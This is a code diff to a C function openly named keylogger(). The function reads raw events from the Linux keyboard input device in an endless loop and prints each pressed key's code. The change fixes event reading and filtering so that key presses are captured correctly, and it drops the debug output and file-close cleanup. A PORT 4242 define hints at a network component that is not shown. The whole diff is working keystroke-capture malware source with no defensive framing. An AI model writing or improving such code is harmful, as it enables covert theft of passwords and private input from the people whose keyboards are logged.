@@ -21,8 +21,6 @@
  #define PORT 4242
 #endif
 
-#define EV_BUF_SIZE 1
-
 void keylogger()
 {
 	int fd, sz;
@@ -31,7 +29,7 @@ void keylogger()
     unsigned version;
     unsigned short id[4];                 
     char name[256] = "N/A";
-	struct input_event ev[EV_BUF_SIZE];
+	struct input_event ev;
 
 	if ((fd = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY)) < 0) 
 		return;
@@ -40,30 +38,12 @@ void keylogger()
     ioctl(fd, EVIOCGNAME(sizeof(name)), name);
 
 	for (;;) {
-        sz = read(fd, ev, sizeof(struct input_event) * EV_BUF_SIZE);
+        sz = read(fd, &ev, sizeof(struct input_event));
 
-        for (i = 0; i < sz / sizeof(struct input_event); ++i) {
-   /*         fprintf(stdout,
-                "%ld.%06ld: "
-                "type=%02x "
-                "code=%02x "
-                "value=%02x\n",
-                ev[i].time.tv_sec,
-                ev[i].time.tv_usec,
-                ev[i].type,
-                ev[i].code,
-                ev[i].value
-            );*/
-        }
-		if (ev[i].type == 4 && ev[i].code == 4)
+		if (ev.type == EV_KEY && ev.value == 1)
 		{
-			printf("%d ", ev[i].code);
+			printf("%d ", ev.code);
 		}
-    }
-
-fine:
-    close(fd);
-
 }
 
 
